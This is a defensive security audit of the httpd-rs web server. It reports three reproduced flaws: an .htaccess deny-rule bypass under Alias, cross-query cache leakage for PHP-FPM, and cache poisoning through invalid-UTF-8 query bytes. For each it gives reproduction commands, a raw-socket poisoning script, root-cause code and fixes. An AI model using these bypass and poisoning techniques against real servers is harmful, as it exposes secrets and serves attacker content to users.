# httpd-rs adversarial findings — Pass 7

**Target:** the current working tree (`HEAD 9a7809c` plus the uncommitted
pass-6 fixes), rebuilt with `cargo build --release -p httpd-rs`. The repository
source was not modified for this pass; all fixtures live under `/tmp/opencode`.

**Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as the
differential oracle where useful. PHP 8.4 FPM was used for the FastCGI cache
reproduction. No external network, IP address, or real web server was involved.

**Status of this pass:** three new issues were reproduced end to end.

* **F53 (Critical):** an anchored `RewriteRule` in a `.htaccess` file inside an
  `Alias`/`AliasMatch`/`ScriptAlias` tree is matched against the wrong
  per-directory URL base. An `.htaccess` deny rule (`RewriteRule ^private/ -
  [F]`) is silently skipped: Apache returns `403`, httpd-rs serves the protected
  file or executes the protected CGI.
* **F54 (High):** the cache dynamic-target check does not recognize
  `SetHandler "proxy:…|fcgi://…"`. With `CacheIgnoreQueryString On`, a PHP-FPM
  response is cached under the query-stripped URL and one query's
  representation is served for every later query.
* **F55 (High/Medium):** the cache key converts the raw query bytes with
  `String::from_utf8_lossy` and falls back to the empty string on invalid
  UTF-8. A request containing an invalid query byte therefore shares a cache
  key with the same URL with no query at all, allowing an attacker to poison
  the clean URL's cache entry.

---

## Top exploit chains (wallet-shaped deployments)

1. **F53 — `.htaccess` deny rules inside an aliased application tree are
   bypassed.** A normal release layout puts the application under
   `/srv/wallet/current/public` and publishes it with:

   ```apache
   Alias /wallet /srv/wallet/current/public
   <Directory /srv/wallet/current/public>
       AllowOverride All
   </Directory>
   ```

   The application's `.htaccess` contains the usual anchored deny list:

   ```apache
   RewriteEngine On
   RewriteRule ^(?:\.git|\.env|wallet\.dat|backups/) - [F,L,NC]
   ```

   Apache returns `403`; httpd-rs returns `200` and serves `.env`, `.git/config`,
   `backups/wallet.dat` or whatever else the rule was meant to protect. The
   same primitive executes a CGI/PHP script that the `.htaccess` rule denies.

2. **F54 — PHP-FPM query-specific responses are shared through the cache.**
   PHP-FPM is commonly wired with `SetHandler` rather than `ProxyPassMatch`:

   ```apache
   <FilesMatch "\.php$">
       SetHandler "proxy:unix:/run/php/php-fpm.sock|fcgi://localhost"
   </FilesMatch>
   CacheEnable disk /
   CacheIgnoreQueryString On
   ```

   A response to `/index.php?token=alpha` is stored under the key for
   `/index.php`; later requests for `?token=beta` and `?token=gamma` receive
   `X-Cache: HIT` and the alpha body. A sessionless wallet endpoint whose query
   selects a record, export, signed URL or display name leaks that selection
   across users.

3. **F55 — clean URLs can be poisoned with an invalid-byte query.** Because an
   invalid-UTF-8 query is converted to `""` in the cache key, a request for
   `/index.php?<invalid-byte>payload` stores its response under `/index.php`.
   Any later unauthenticated request for the clean `/index.php` receives the
   poisoned response. If the application reflects or redirects from the query,
   this becomes stored XSS or an open-redirect cache poison for every visitor
   of the clean URL.

---

## Findings at a glance

| ID | Severity | Area | Demonstrated impact | Preconditions |
|---|---|---|---|---|
| F53 | Critical | `.htaccess` per-directory rewrite base | Anchored `[F]` deny rules are skipped; protected static file read and protected CGI execution | Directory `Alias`/`AliasMatch`/`ScriptAlias` tree, `.htaccess` enabled, anchored rule |
| F54 | High | Cache dynamic-target classification | Cross-query PHP-FPM representation leak / cache poisoning | Cache enabled, `CacheIgnoreQueryString On`, `SetHandler` FastCGI, cacheable dynamic response |
| F55 | High/Medium | Cache key query encoding | Invalid-byte query poisons the clean URL's cache entry; cross-query leak | Cache enabled, cacheable dynamic response, raw invalid UTF-8 byte in query |

---

# F53. Critical: `.htaccess` per-directory `RewriteRule` uses the alias target path, not the URL mount

## Impact

For a directory-mapped alias such as:

```apache
Alias /site "/srv/site"
<Directory "/srv/site">
    AllowOverride All
    Require all granted
</Directory>
```

a request for `/site/private/wallet.dat` is mapped by `map_path()` to
`/srv/site/private/wallet.dat`. The access-file walk correctly finds
`/srv/site/.htaccess` and `/srv/site/private/.htaccess`, and the parser
correctly loads their rules. But the **per-directory base** passed to
`parse_rewrite_rule()` is derived from the **filesystem path relative to the
alias target**, not from the URL prefix that exposed that directory:

```text
request URL              /site/private/wallet.dat
mapping root (alias)     /srv/site
.htaccess directory      /srv/site
base passed to parser    /                    (correct: /site/)
rule match_base          /
subject_for()            "site/private/wallet.dat"
anchored pattern         ^private/            -> no match
```

Apache's per-directory context for `/srv/site/.htaccess` is `/site/`, so its
subject is `private/wallet.dat` and the rule fires. The same failure happens
for a `.htaccess` in `/srv/site/private`: httpd-rs gives it `/private/` while
the request URL is `/site/private/...`, so `subject_for()` cannot even strip a
prefix and the rule is skipped.

This is a pure authorization bypass. No symlink, writable directory, local
account, proxy or second bug is needed. It applies to every anchored
per-directory rule that is meant to select an access decision, including
`[F]`, `[G]` and URL-level redirects.

## Reproduction: root `.htaccess` deny

```sh
D=/tmp/opencode/p7-f53
rm -rf "$D"; mkdir -p "$D/www" "$D/site/private" "$D/logs"

printf 'WALLET-F53-STATIC-SECRET\n' > "$D/site/private/wallet.dat"
printf 'RewriteEngine On\nRewriteRule ^private/ - [F]\n' \
    > "$D/site/.htaccess"

cat > "$D/vp.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19340
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/site">
    AllowOverride All
    Require all granted
</Directory>
Alias /site "$D/site"
EOF

./target/release/httpd-rs -f "$D/vp.conf" -DFOREGROUND &
curl -i http://127.0.0.1:19340/site/private/wallet.dat
```

Observed against the current release binary:

```text
HTTP/1.1 200 OK
Content-Length: 27

WALLET-F53-STATIC-SECRET
```

Apache 2.4.69 with the same `Alias`, directory section and `.htaccess` returns:

```text
HTTP/1.1 403 Forbidden
```

The access-file layer was read; only the rewrite subject/base was wrong.

A wallet-shaped variant is just as direct:

```sh
printf 'WALLET_SEED=correct-horse-battery-staple\n' > "$D/site/.env"
printf 'RewriteEngine On\nRewriteRule ^\\.env$ - [F]\n' > "$D/site/.htaccess"
curl http://127.0.0.1:19340/site/.env
```

Observed:

```text
httpd-rs: 200 WALLET_SEED=correct-horse-battery-staple
Apache : 403 Forbidden
```

## Reproduction: nested `.htaccess` with a different anchored rule

```sh
printf 'RewriteEngine On\nRewriteRule ^wallet\\.dat$ - [F]\n' \
    > "$D/site/private/.htaccess"
```

Request `/site/private/wallet.dat`:

```text
httpd-rs: 200 WALLET-F53-STATIC-SECRET
Apache : 403 Forbidden
```

Here the base passed to the nested parser is `/private/`, while the request
path is `/site/private/wallet.dat`; `subject_for()` has no matching prefix and
skips every per-directory rule in that layer.

## Reproduction: `AliasMatch` and `ScriptAlias`

The same defect reproduces for the other directory-mapping forms:

```apache
AliasMatch "^/m/(.*)$" "/srv/site/$1"
ScriptAlias /cgi "/srv/site/cgi"
```

With `/srv/site/cgi/.htaccess` containing:

```apache
RewriteEngine On
RewriteRule ^run\.cgi$ - [F]
```

the results are:

```text
GET /m/private/wallet.dat
httpd-rs: 200 WALLET-F53-STATIC-SECRET
Apache : 403 Forbidden

GET /cgi/run.cgi
httpd-rs: 200 WALLET-F53-CGI-SECRET
Apache : 403 Forbidden
```

The CGI variant is execution of a script the administrator explicitly denied
in its own directory, not merely source disclosure.

## `RewriteBase` does not mitigate it

An administrator who follows Apache's documentation and adds the base
explicitly still gets the bypass:

```apache
RewriteEngine On
RewriteBase /site/
RewriteRule ^base/secret\.txt$ - [F]
```

Observed for `/site/base/secret.txt`:

```text
httpd-rs: 200 WALLET-BASE-SECRET
Apache : 403 Forbidden
```

`RewriteBase` changes the substitution base (`rule.base`) in the current
parser, but not `rule.match_base`, and the latter is what `subject_for()` uses.

## Control: the same rule works under `DocumentRoot`

With `DocumentRoot /srv/site` (no alias), the same root `.htaccess` and the
same request `/private/wallet.dat` return `403` from httpd-rs. This confirms the
failure is specific to the alias URL mount, not to `[F]` parsing.

## Root cause

`collect_layers_with_root()` passes the **filesystem mapping root** to
`dir_url_base()`:

```rust
// crates/server/src/htaccess.rs:220, 399, 485
let base = dir_url_base(&root, &dir, url_path);
```

For an alias, `root` is the alias target (`/srv/site`), not the URL mount
(`/site`). `dir_url_base()` then takes the target-relative branch:

```rust
// crates/server/src/htaccess.rs:657-670
fn dir_url_base(root: &Path, dir: &Path, url_path: &str) -> String {
    if let Ok(rel) = dir.strip_prefix(root) {
        let rel = rel.to_string_lossy().replace('\\', "/");
        let rel = rel.trim_matches('/');
        return if rel.is_empty() {
            "/".into()
        } else {
            format!("/{rel}/")
        };
    }
    // Aliased content: derive the URL directory from the requested path.
    let parent = url_path.rsplit_once('/').map(|(p, _)| p).unwrap_or("");
    normalize_rewrite_base(parent)
}
```

The "Aliased content" fallback is only reached when `dir` is **not** under
`root`. In production, `root` is the alias target, so every directory in the
alias tree takes the target-relative branch and the fallback is dead code for
exactly the case it was written for. The unit test at
`crates/server/src/htaccess.rs:3467` passes an alias directory **outside**
`www`, so it exercises the fallback rather than the production alias path.

The parser stores that wrong base as the rule's per-directory match base:

```rust
// crates/server/src/htaccess.rs:633
scope.rewrite_policy.rewrite_match_base = Some(normalize_rewrite_base(base_url));
```

and then the per-directory rewrite subject is computed by stripping it:

```rust
// crates/server/src/rewrite.rs:582-588
fn subject_for<'a>(rule: &RewriteRule, path: &'a str) -> Option<&'a str> {
    if rule.per_dir {
        let rel = path.strip_prefix(&rule.match_base)?;
        Some(rel.trim_start_matches('/'))
    } else {
        Some(path)
    }
}
```

With `match_base = "/"`, the subject is `site/private/wallet.dat`; with
`match_base = "/private/"`, `strip_prefix` fails. Both skip the anchored rule.

The project model currently claims the alias target is the identity for
`dir_url_base()`/rewrite bases:

* `docs/config-semantics.md:1050` — "the alias root remains the identity for
  `dir_url_base()`/rewrite bases";
* `crates/verified/src/lib.rs:956` — `alias_mapping_root_admit` states the
  mapping root selected by URL mapping is used for URL/`RewriteBase`
  derivation.

That is the modeling error: the filesystem mapping root and the URL mount are
different identities. This is not a re-run of F50/F51/F52. Those findings were
about which access-file layers are collected and how cache targets are bound;
F53 is about the per-directory rewrite subject **inside** a correctly collected
layer.

The main-configuration analog already computes the correct base from the URL
path depth:

```rust
// crates/server/src/config.rs:10212-10231
fn url_base_for_directory(dir: &Path, fs_path: &Path, url_path: &str) -> Option<String> {
    let rel = fs_path.strip_prefix(dir).ok()?;
    let depth = rel.components().count();
    let mut parts: Vec<&str> = url_path
        .trim_matches('/')
        .split('/')
        .filter(|p| !p.is_empty())
        .collect();
    // ... truncate the URL by depth and join ...
}
```

The `.htaccess` path should use the URL mount and depth, not the target-relative
path.

## Remediation

1. Pass the **URL mapping record** from `map_path()`—the matched prefix (or
   regex-consumed URL prefix) and the filesystem base—into
   `collect_layers_with_root()`. Derive the per-directory URL base from that
   record, never from `dir.strip_prefix(alias_target)`.
2. Alternatively, compute the base from `url_path` and the depth of `dir`
   below the mapping root for every layer, including aliases; this is the same
   computation already used by `Config::url_base_for_directory()`.
3. Ensure a `.htaccess` at alias target `/srv/site` gets base `/site/`, and one
   at `/srv/site/private` gets base `/site/private/`, for prefix `Alias`,
   `AliasMatch` and `ScriptAlias`.
4. Do not rely on `RewriteBase` to repair the subject base. The per-directory
   matching subject is relative to the directory's URL prefix independently of
   the substitution base.
5. Add differential regressions for:
   * root and nested `.htaccess` anchored `[F]` rules under `Alias`;
   * `AliasMatch` and `ScriptAlias` directory trees;
   * static files, directory indexes, CGI and FastCGI targets;
   * an explicit `RewriteBase /site/`;
   * both alias orders and an alias whose target is inside `DocumentRoot`.

## Model / regression updates

Add an invariant such as:

```text
I50 — htaccess rewrite subject base
For an access-file layer at filesystem directory D mapped from URL U,
per_dir_rule.match_base == URL prefix of D under the mapping selected by
map_path(U).  It is not the path of D relative to an alias target.

subject_for(rule, U) == U[rule.match_base.len()..] without a leading slash.
```

Update I21/I48 so `filesystem_mapping_root` and `url_mount` are separate
fields. Add the F53 shapes to `tests/adversarial_regressions.py` and the
verification ledger's replay budget.

---

# F54. High: cache dynamic-target check misses `SetHandler "proxy:…|fcgi://…"`

## Impact

The F52 fix correctly resolves `DirectoryIndex` before the cache decision and
rebinds the cache target to the selected index. But the dynamic-target test
used to decide whether `CacheIgnoreQueryString` may drop the query still only
recognizes:

* `ScriptAlias`,
* `cgi-script` (through `cgi::is_cgi`),
* `ProxyPass`/`ProxyPassMatch` (through `fastcgi::match_proxy`),
* HTTP proxy routes (through `proxy::matches_route`).

It does **not** recognize a FastCGI target selected by
`SetHandler "proxy:unix:…|fcgi://…"`. That form is handled later in
`dispatch_inner()` by `fastcgi::handler_target_for_file()`, after a file has
been opened and authorized. For the cache, the target still looks static.
With `CacheIgnoreQueryString On`, the query is removed from the cache key:

```text
GET /direct.php?token=alpha -> MISS, body "DIRECT-SECRET-token=alpha"
GET /direct.php?token=beta  -> HIT,  body "DIRECT-SECRET-token=alpha"
GET /direct.php?token=gamma -> HIT,  body "DIRECT-SECRET-token=alpha"
```

The same happens for a `DirectoryIndex index.php` target:

```text
GET /dir/?token=alpha -> MISS, body "INDEX-SECRET-token=alpha"
GET /dir/?token=beta  -> HIT,  body "INDEX-SECRET-token=alpha"
GET /dir/?token=gamma -> HIT,  body "INDEX-SECRET-token=alpha"
```

This is the exact class F52/I49 was intended to close: a dynamic
query-specific representation is shared across queries. Here the leak survives
the F52 fix because the dynamic classification, not the index binding, is
incomplete. As with any shared cache, the response must be cacheable and must
not set a cookie (httpd-rs deliberately refuses to store `Set-Cookie`
responses); sessionless APIs and export/download endpoints are the common
targets.

## Reproduction

PHP files:

```php
<?php header('Content-Type: text/plain');
echo "DIRECT-SECRET-" . ($_SERVER['QUERY_STRING'] ?? '') . "\n"; ?>
```

```apache
ServerRoot "/tmp/opencode/p7-f54"
Listen 127.0.0.1:19342
DocumentRoot "/tmp/opencode/p7-f54/www"
CacheRoot "/tmp/opencode/p7-f54/cache"
CacheEnable disk /
CacheIgnoreQueryString On
CacheIgnoreNoLastMod On
CacheHeader On
CacheDefaultExpire 3600
CacheMaxExpire 3600
DirectoryIndex index.php

<FilesMatch "\.php$">
    SetHandler "proxy:unix:/run/php/php8.4-fpm.sock|fcgi://localhost"
</FilesMatch>

<Directory "/tmp/opencode/p7-f54/www">
    Require all granted
</Directory>
```

Requests:

```sh
for q in alpha beta gamma; do
  curl -sS -D - "http://127.0.0.1:19342/direct.php?token=$q" -o -
done
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK
X-Cache: MISS
DIRECT-SECRET-token=alpha

HTTP/1.1 200 OK
Age: 0
X-Cache: HIT
DIRECT-SECRET-token=alpha

HTTP/1.1 200 OK
Age: 0
X-Cache: HIT
DIRECT-SECRET-token=alpha
```

Apache 2.4.69 with `mod_proxy_fcgi`, `mod_cache`/`mod_cache_disk` and the same
PHP-FPM `SetHandler` configuration did not return a HIT for the beta/gamma
requests; each was a MISS with its own query response. Even where Apache's
mod_cache declines to store the FCGI response, it never merges the queries.

`CacheIgnoreNoLastMod On`/`CacheDefaultExpire` is one way to make the PHP
response cacheable in this fixture. An application that sends `Last-Modified`
or `Cache-Control: max-age=…` is cacheable without those options; the
`CacheIgnoreQueryString` dynamic bypass is still the boundary that is being
missed.

## Root cause

The dynamic check is in `crates/server/src/cache.rs:376-396`:

```rust
if cfg.cache.ignore_query_string && !req.query.is_empty() {
    let name = fs_path.file_name().map(|n| n.as_encoded_bytes()).unwrap_or(b"");
    let dynamic = script_alias
        || crate::cgi::is_cgi(cfg, &scope, name, false)
        || crate::fastcgi::match_proxy(&scope, &cache_url_path, &root).is_some()
        || crate::proxy::matches_route(&scope, &cache_url_path);
    if !httpd_rs_verified::cache_ignore_query_admit(
        cfg.cache.ignore_query_string,
        !req.query.is_empty(),
        dynamic,
    ) {
        return None;
    }
}
```

`fastcgi::match_proxy()` searches only the `ProxyPass`/`ProxyPassMatch` route
table. `SetHandler "proxy:…"` is selected later in the dispatcher:

```rust
// crates/server/src/server.rs:2550-2567
if let Some(target) =
    fastcgi::handler_target_for_file(scope, &root, &rel, &url_path, &actual_path)
{
    return run_fastcgi(..., &target, ...);
}
```

`handler_target_for_file()` resolves the handler from
`effective_handler(scope, name)` and accepts any value beginning with `proxy:`
(`crates/server/src/fastcgi.rs:391-423`). The cache never calls that resolver
before deciding that `CacheIgnoreQueryString` is safe.

The directory-index branch has the same gap: after F52 resolves the index, the
dynamic check uses `fs_path.file_name()` (`index.php`) and still only calls
`match_proxy`, so an index served through `SetHandler proxy:` is treated as
static.

## Remediation

1. Introduce one handler/dynamic-target classifier shared by dispatch and
   cache, e.g. `fastcgi::dynamic_target_for(scope, root, rel, url_path,
   fs_path)`, covering:
   * `ProxyPass`/`ProxyPassMatch`,
   * `SetHandler "proxy:unix:…|fcgi://…"`,
   * `SetHandler "proxy:fcgi://…"`,
   * `cgi-script`,
   * `ScriptAlias`,
   * `server-status` and any other non-static handler.
2. Run the classifier after `DirectoryIndex` resolution and after any internal
   subrequest target resolution. Feed its result to
   `cache_ignore_query_admit()`.
3. Never apply `CacheIgnoreQueryString` to a target whose effective handler is
   not the default static handler, even if the URL has a static-looking
   basename.
4. Add regressions for direct `.php` URLs and `DirectoryIndex index.php` with
   `SetHandler "proxy:…"`, asserting alpha/beta/gamma all MISS and carry their
   own body. Add the Apache differential.

## Model / regression updates

Extend I49's `dynamic(selected_index)` to include handler-based target
selection, not only proxy routes and CGI extension checks. The cache key and
policy must be bound to the actual handler target as well as the selected file.
Add the `SetHandler proxy:fcgi` shape (both direct and index) to
`tests/adversarial_regressions.py`; the existing F52 fixture only covers
`index.cgi`, which `cgi::is_cgi()` catches.

---

# F55. High/Medium: lossy UTF-8 query conversion collides invalid-byte queries with the empty query

## Impact

`base_key()` converts the raw query bytes with:

```rust
// crates/server/src/cache.rs:582-587
let query = if cfg.cache.ignore_query_string {
    ""
} else {
    std::str::from_utf8(query).unwrap_or("")
};
```

Any invalid UTF-8 byte in the query becomes `""`, because `unwrap_or("")`
discards the entire query. The request parser does not reject such bytes: the
verified target predicate admits every byte `>= 0x21` except `0x7f`
(`crates/verified/src/lib.rs:1393-1400`), and the query is kept as raw bytes.

The policy fingerprint does not include the query; only the cache key does.
Therefore:

```text
/index.php?<invalid byte>POISON  -> key query ""
/index.php                     -> key query ""
```

Two different requests share one cache entry. This works even with
`CacheIgnoreQueryString` **Off**, and for any cacheable dynamic target (CGI,
FastCGI or a `SetHandler` PHP endpoint); the fixture below uses PHP-FPM.

## Reproduction

Use the same PHP-FPM `SetHandler` endpoint as F54, but leave
`CacheIgnoreQueryString` **off** (the default):

```apache
Listen 127.0.0.1:19309
DocumentRoot "/tmp/opencode/p7-f55/www"
CacheRoot "/tmp/opencode/p7-f55/cache"
CacheEnable disk /
CacheIgnoreNoLastMod On
CacheHeader On
CacheDefaultExpire 3600
CacheMaxExpire 3600
<FilesMatch "\.php$">
    SetHandler "proxy:unix:/run/php/php8.4-fpm.sock|fcgi://localhost"
</FilesMatch>
```

A PHP endpoint that reflects the query makes the collision visible:

```php
<?php
header('Content-Type: text/plain');
$q = $_SERVER['QUERY_STRING'] ?? '';
echo "PAGE[" . bin2hex($q) . "]=" . $q . "\n";
```

Send the invalid-byte query first, then the clean URL:

```python
import socket

def req(target):
    s = socket.create_connection(("127.0.0.1", 19309))
    s.sendall(b"GET " + target + b" HTTP/1.1\r\n"
              b"Host: localhost\r\nConnection: close\r\n\r\n")
    data = b""
    while True:
        part = s.recv(65536)
        if not part:
            break
        data += part
    s.close()
    return data

for target in (b"/index.php?\xffPOISON", b"/index.php", b"/index.php?normal"):
    data = req(target)
    print(target, data.split(b"\r\n\r\n", 1)[0])
    print(data.split(b"\r\n\r\n", 1)[1])
```

Observed:

```text
b'/index.php?\xffPOISON' -> 200, X-Cache: MISS
  PAGE[efbfbd504f49534f4e]=\xef\xbf\xbdPOISON

b'/index.php'            -> 200, X-Cache: HIT
  PAGE[efbfbd504f49534f4e]=\xef\xbf\xbdPOISON

b'/index.php?normal'     -> 200, X-Cache: MISS
  PAGE[6e6f726d616c]=normal
```

The clean URL has been poisoned with the response produced for the
invalid-byte query. The PHP side sees U+FFFD because `cgi::sanitize_env_value`
also uses lossy UTF-8 conversion (`crates/server/src/cgi.rs:138-142`), but the
attacker controls the ASCII payload following the invalid byte, so an
application that reflects or redirects from the query can place attacker
content into the clean URL's cached response for every user.

Apache's mod_cache keys the raw query bytes; with the same invalid query its
cache debug log records:

```text
cache: Key for entity /index.php?\xffPOISON is http://localhost:80/index.php?\xffPOISON
cache: Key for entity /index.php?normal is http://localhost:80/index.php?normal
```

so the invalid query and the empty query are distinct entities.

## Root cause

`crates/server/src/cache.rs:571-598` builds the key from a lossy `String` for
the query, and also uses lossy `path`/`target.display()` components:

```rust
format!(
    "{}\n{host}\n{path}\n{query}\n{scheme}\n{local_ip}\n{local_port}\n{vhost_id}\n{target}\n{policy_fingerprint:016x}",
    cfg.server_root.display(),
    target = target.display(),
)
```

Only the query loss is demonstrated here, but the same injectivity problem
exists for invalid-byte paths and targets: `String::from_utf8_lossy` maps every
invalid sequence to the same replacement character, and `Path::display()` does
the same. `base_key()` must be injective over the raw byte inputs that select a
cache entry.

## Remediation

1. Encode raw query bytes unambiguously, for example as lowercase hex or
   percent-encoding with `%` itself escaped. Do not call
   `String::from_utf8_lossy(...).unwrap_or("")` in key material.
2. Do the same for the raw URL path, filesystem target bytes and host authority.
   Use length-prefixed fields or a binary digest over the exact byte sequences.
3. Keep the policy fingerprint and cache key separate: the key needs the raw
   query; the policy fingerprint need not hash it, but the key must not collapse
   distinct queries.
4. Add unit tests that call `base_key`/`request_scope` with:
   * `query = b""` vs `query = b"\xff"`,
   * `query = b"?a=\xff"` vs `query = b"?a=\xfe"`,
   * an invalid-byte path versus the empty/replacement path,
   and assert the keys differ and no clean-URL entry is served.
5. Add an end-to-end regression that poisons `/index.php` through an
   invalid-byte query and asserts the clean URL remains a MISS with its own
   body.

## Model / regression updates

Add a cache-key injectivity obligation:

```text
I51 — cache key byte identity
base_key(request) == base_key(request') only if the listener, vhost, host,
raw URL path, raw query, resolved target bytes and policy fingerprint are
identical as byte strings.
```

The current `url_path`/`Path::display()`-based key does not satisfy this for
non-UTF-8 inputs.

---

# Non-promoted review targets

These were noticed while building the F53–F55 fixtures but were not promoted
to full wallet-shaped findings in this pass:

* **ErrorDocument internal subrequests are not bound by the cache.** The F52
  fix resolves `DirectoryIndex`, but a local `ErrorDocument` is still an
  internal subrequest selected after the cache scope is built. A cacheable
  error document served through `SetHandler proxy:`/PHP could be cached under
  the missing URL; a query-dependent error document or a live `.htaccess`
  change affecting the error target would then have the same class of leak as
  F54/F55. This should be resolved or excluded from caching in the same
  handler-target refactor.
* **Other internal handlers are not in the dynamic classifier.** `server-status`
  and any future non-static `SetHandler` need the same treatment as
  `SetHandler proxy:`. The classifier should be a total function over the
  handler registry, not a growing `||` chain.
* **Invalid-byte paths/targets have the same lossy-key risk.** F55 demonstrates
  the query; `Path::display()` and `url_path` conversion also collapse
  non-UTF-8 path bytes. A local application that creates files with invalid
  UTF-8 names could expose the same key collision. The key encoding should be
  fixed for every byte component at once.
* **`RewriteBase` handling is still confusing even after F53.** The parser
  stores it as a substitution base but not as a match base; once the correct
  URL mount is passed, keep the two concepts explicit in the model and tests.
* **F53 also affects `[G]`, `[R]`, `[P]`, `[E]` and other anchored per-directory
  effects**, not just `[F]`. The deny/execute case is the security-relevant one
  demonstrated here; compatibility tests should cover the broader set after the
  base fix.

---

# Reproduction notes

* All fixtures are under `/tmp/opencode/p7-*`; the repository source was not
  edited.
* `target/release/httpd-rs` was rebuilt from the current working tree before
  the pass (`cargo build --release -p httpd-rs`).
* Apache 2.4.69 was started with a private config on high loopback ports with
  only the modules needed for `Alias`/`ScriptAlias`/`mod_rewrite`/`mod_cgi`/
  `mod_proxy_fcgi`/`mod_cache_disk`.
* PHP-FPM was the system PHP 8.4 FPM socket
  (`/run/php/php8.4-fpm.sock`); the same technique applies to any configured
  `SetHandler "proxy:unix:…|fcgi://…"` or `SetHandler "proxy:fcgi://…"`.
* No source-level `unsafe` or verified kernel was bypassed for any finding.
  F53 is a URL-base identity bug above the verified layer; F54 is an incomplete
  handler classification; F55 is a lossy encoding in cache-key material.
